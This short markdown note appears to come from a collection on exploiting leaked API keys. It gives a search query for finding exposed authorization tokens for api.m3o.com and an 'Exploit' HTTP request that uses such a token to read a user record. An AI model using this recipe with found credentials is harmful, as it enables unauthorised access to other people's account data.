# Micro User Service

## Search

```
api.m3o.com AND Authorization
```

## Exploit

```
POST https://api.m3o.com/v1/user/Read HTTP/1.1
Host: api.m3o.com
Content-Type: application/json
Authorization: Bearer {{token}}
Content-Length: 21

{
    "id": "usrid-1"
}
```
